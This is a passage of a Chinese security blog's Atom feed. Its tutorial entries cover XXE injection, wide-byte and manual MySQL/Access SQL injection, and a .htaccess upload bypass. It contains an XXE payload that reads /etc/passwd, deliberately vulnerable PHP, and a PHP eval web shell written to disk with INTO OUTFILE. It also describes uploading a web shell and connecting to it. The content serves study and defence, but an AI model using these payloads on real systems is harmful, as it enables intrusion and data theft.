&amp;lt;input type=&amp;#39;text&amp;#39; value=&amp;#39;&amp;lt;?php echo $name?&amp;gt;&amp;#39;&amp;gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现无法绕过了：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/kufslbaofmpw2naqxv7fci8l/image_1bfttoqf017gu1b911n0sqt91d9cm.png&quot; alt=&quot;image_1bfttoqf017gu1b911n0sqt91d9cm.png-20.9kB&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XXE注入</title>
    <link href="http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-14T03:05:43.000Z</published>
    <updated>2020-01-14T03:32:05.560Z</updated>
    
    <summary type="html">
    
      &lt;h3 id=&quot;XXE注入攻击简介&quot;&gt;&lt;a href=&quot;#XXE注入攻击简介&quot; class=&quot;headerlink&quot; title=&quot;XXE注入攻击简介&quot;&gt;&lt;/a&gt;XXE注入攻击简介&lt;/h3&gt;&lt;p&gt;XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。&lt;br&gt;在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。&lt;br&gt;当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。&lt;/p&gt;
&lt;h3 id=&quot;XXE注入利用&quot;&gt;&lt;a href=&quot;#XXE注入利用&quot; class=&quot;headerlink&quot; title=&quot;XXE注入利用&quot;&gt;&lt;/a&gt;XXE注入利用&lt;/h3&gt;&lt;p&gt;首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。&lt;/p&gt;
&lt;h4 id=&quot;简单检测&quot;&gt;&lt;a href=&quot;#简单检测&quot; class=&quot;headerlink&quot; title=&quot;简单检测&quot;&gt;&lt;/a&gt;简单检测&lt;/h4&gt;&lt;p&gt;Payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE any[
&amp;lt;!ENTITY test &amp;quot;this is a test&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h4&gt;&lt;p&gt;Payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;  
&amp;lt;!DOCTYPE ANY [  
&amp;lt;!ENTITY test SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;  
]&amp;gt; 
&amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt;&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="XXE注入" scheme="http://yoursite.com/categories/XXE%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="XXE注入" scheme="http://yoursite.com/tags/XXE%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>宽字节注入</title>
    <link href="http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-14T02:59:18.000Z</published>
    <updated>2020-01-14T03:02:54.036Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;    &amp;lt;?php  
    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);  
    $conn = mysql_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;root&amp;#39;);  
    mysql_select_db(&amp;quot;test&amp;quot;, $conn);  
    mysql_query(&amp;quot;SET NAMES GBK&amp;quot;, $conn);    //不安全的编码方式  

    $id = addslashes($_GET[&amp;#39;id&amp;#39;]);          //不安全的转义函数  
    $sql = &amp;quot;select * from test where id=&amp;#39;$id&amp;#39;&amp;quot;;  
    $query = mysql_query($sql, $conn);  
    if($query == True)  
    {  
        $result = mysql_fetch_array($query);  
        $user = $result[&amp;quot;user&amp;quot;];  
        $email = $result[&amp;quot;email&amp;quot;];  

        print_r(&amp;#39;用户名： &amp;#39; . $user . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
        print_r(&amp;#39;邮  箱： &amp;#39; . $email . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
        $sql = mb_convert_encoding($sql, &amp;quot;UTF-8&amp;quot;, &amp;quot;GBK&amp;quot;);  
        print_r(&amp;#39;&amp;lt;br /&amp;gt;SQL语句：&amp;#39; . $sql);  

    }  

    mysql_close($conn);  
    ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png&quot; alt=&quot;image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png&quot; alt=&quot;image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：&lt;br&gt;set character_set_connection = gbk,&lt;br&gt;set character_set_results=gbk,&lt;br&gt;set character_set_client=gbk&lt;br&gt;而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。&lt;/p&gt;
&lt;p&gt; 漏洞的防范方法有以下几种：&lt;br&gt;1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。&lt;br&gt;2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。&lt;br&gt;3） 使用pdo方式预编译处理数据库查询。&lt;/p&gt;

    
    </summary>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Mysql导出一句话</title>
    <link href="http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
    <id>http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/</id>
    <published>2020-01-14T02:44:59.000Z</published>
    <updated>2020-01-14T02:49:19.231Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;执行语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php+HTML&quot;&gt;create table yjh(cmd varchar(50));
insert into yjh(cmd) values(&amp;#39;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&amp;#39;);
select cmd from yjh into outfile &amp;#39;D:/www/example/cmd.php&amp;#39;;
drop table yjh;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：&lt;br&gt;● null，表示不允许导入/导出，默认状态为null；&lt;br&gt;● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；&lt;br&gt;● 没有具体的值，表示不对mysql的导入/导出做出限制。&lt;/p&gt;
&lt;p&gt;启用secure-file-priv的方法：&lt;br&gt;● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;br&gt;● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;/p&gt;

    
    </summary>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MySQL注入</title>
    <link href="http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-13T09:31:17.000Z</published>
    <updated>2020-01-13T10:33:43.357Z</updated>
    
    <summary type="html">
    
      &lt;h3 id=&quot;MySQL的一些特性&quot;&gt;&lt;a href=&quot;#MySQL的一些特性&quot; class=&quot;headerlink&quot; title=&quot;MySQL的一些特性&quot;&gt;&lt;/a&gt;MySQL的一些特性&lt;/h3&gt;&lt;p&gt;MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：&lt;br&gt;●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；&lt;br&gt;●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；&lt;br&gt;●MySQL有管理员用户名和密码，超级用户是root；&lt;br&gt;●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。&lt;br&gt;MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。&lt;/p&gt;
&lt;h3 id=&quot;判断注入点&quot;&gt;&lt;a href=&quot;#判断注入点&quot; class=&quot;headerlink&quot; title=&quot;判断注入点&quot;&gt;&lt;/a&gt;判断注入点&lt;/h3&gt;&lt;p&gt;判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：&lt;a href=&quot;http://localhost/test/injection.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://localhost/test/injection.php?id=1&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/490m31t8kx00cccg0v4eqr74/1.png&quot; alt=&quot;1.png-17kB&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;判断当前数据表列数&quot;&gt;&lt;a href=&quot;#判断当前数据表列数&quot; class=&quot;headerlink&quot; title=&quot;判断当前数据表列数&quot;&gt;&lt;/a&gt;判断当前数据表列数&lt;/h3&gt;&lt;p&gt;使用order by语句来判断当前数据表的列数，语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;order by N&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。&lt;br&gt;判断当前数据表的列数：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/gteaqk3s6zfq4hkvlh9bkefa/2.png&quot; alt=&quot;2.png-41.6kB&quot;&gt;&lt;br&gt;当前数据表的列数是7。&lt;br&gt;我们也可以使用union语句来判断当前数据表的列数，语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;and 1=2 union select 1,2,3…&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/9y80j21sfuvdg4u7jf496eoh/3.png&quot; alt=&quot;3.png-17.1kB&quot;&gt;&lt;br&gt;我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Access注入</title>
    <link href="http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-13T08:58:44.000Z</published>
    <updated>2020-01-13T09:26:53.757Z</updated>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Access的一些特性&quot;&gt;&lt;a href=&quot;#Access的一些特性&quot; class=&quot;headerlink&quot; title=&quot;Access的一些特性&quot;&gt;&lt;/a&gt;Access的一些特性&lt;/h3&gt;&lt;p&gt;Access的一些特性如下：&lt;br&gt;●Aceess通常搭配ASP网站；&lt;br&gt;●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。&lt;br&gt;●Access数据库没有用户名和密码，也没有数据库名。&lt;/p&gt;
&lt;h3 id=&quot;Access手工注入&quot;&gt;&lt;a href=&quot;#Access手工注入&quot; class=&quot;headerlink&quot; title=&quot;Access手工注入&quot;&gt;&lt;/a&gt;Access手工注入&lt;/h3&gt;&lt;p&gt;Access注入的步骤通常如下：&lt;br&gt;（1）.判断注入点&lt;br&gt;（2）.猜解表名&lt;br&gt;（3）.猜解列名&lt;br&gt;（4）.猜解内容&lt;/p&gt;
&lt;h4 id=&quot;判断注入点&quot;&gt;&lt;a href=&quot;#判断注入点&quot; class=&quot;headerlink&quot; title=&quot;判断注入点&quot;&gt;&lt;/a&gt;判断注入点&lt;/h4&gt;&lt;p&gt;判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。&lt;/p&gt;
&lt;h4 id=&quot;猜解表名&quot;&gt;&lt;a href=&quot;#猜解表名&quot; class=&quot;headerlink&quot; title=&quot;猜解表名&quot;&gt;&lt;/a&gt;猜解表名&lt;/h4&gt;&lt;p&gt;Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;and exists(select * from 表名)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果返回正常，说明数据库中有这个表。&lt;br&gt;猜解是否有user表：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/vanlgelocnslo0ks81eiccog/1.png&quot; alt=&quot;1.png-34.6kB&quot;&gt;&lt;br&gt;显示出错，说明没有user表。&lt;br&gt;猜解是否有admin表：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/lrve5pbr4w72pwac8njkahkp/2.png&quot; alt=&quot;2.png-291.2kB&quot;&gt;&lt;br&gt;很明显，有admin这个表。&lt;/p&gt;
    
    </summary>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>.htaccess绕过黑名单上传</title>
    <link href="http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-01-11T10:35:58.000Z</published>
    <updated>2020-01-14T02:57:12.594Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;sup&gt;[1]&lt;/sup&gt;&lt;br&gt;在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。&lt;br&gt;测试上传功能的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;meta http-equiv=&amp;quot;content-type&amp;quot; content=&amp;quot;text/html;charset=utf-8&amp;quot;&amp;gt;
&amp;lt;form action=&amp;quot;&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php 
$black_list = array(&amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;php2&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;txt&amp;#39;);
if(isset($_FILES[&amp;#39;file&amp;#39;]))
{
    $file_name = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;name&amp;#39;];
    $file_path = &amp;#39;images/&amp;#39; . $file_name;
    $file_ext = substr($file_name, strrpos($file_name, &amp;#39;.&amp;#39;)+1);
    $file_tmp = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
    foreach($black_list as $key=&amp;gt;$value)
    {
        if($value == strtolower($file_ext))
        {
            echo &amp;quot;不允许上传的文件类型！&amp;quot;;
            exit(0);
        }
    }

    if(!move_uploaded_file($file_tmp, $file_path))
    {
        echo &amp;quot;文件上传失败！&amp;quot;;
    }
    else
    {
        echo &amp;quot;文件上传成功，文件路径为&amp;quot; . $file_path;
    }
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;新建.htaccess文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;FilesMatch &amp;quot;lala&amp;quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png&quot; alt=&quot;1.png-24.9kB&quot;&gt;&lt;br&gt;接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png&quot; alt=&quot;2.png-25.2kB&quot;&gt;&lt;br&gt;两个文件都能上传成功，使用菜刀连接lala文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png&quot; alt=&quot;3.png-75.3kB&quot;&gt;&lt;br&gt;所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。&lt;/p&gt;
&lt;p&gt;参考：&lt;br&gt;[1]百度百科：&lt;a href=&quot;https://baike.baidu.com/item/htaccess/1645473&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://baike.baidu.com/item/htaccess/1645473&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
    
      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/01/11/hello-world/"/>
    <id>http://yoursite.com/2020/01/11/hello-world/</id>
    <published>2020-01-11T07:54:24.958Z</published>
    <updated>2020-01-10T07:21:15.000Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo new &amp;quot;My New Post&amp;quot;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Run-server&quot;&gt;&lt;a href=&quot;#Run-server&quot; class=&quot;headerlink&quot; title=&quot;Run server&quot;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo server&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/server.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Generate-static-files&quot;&gt;&lt;a href=&quot;#Generate-static-files&quot; class=&quot;headerlink&quot; title=&quot;Generate static files&quot;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo generate&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
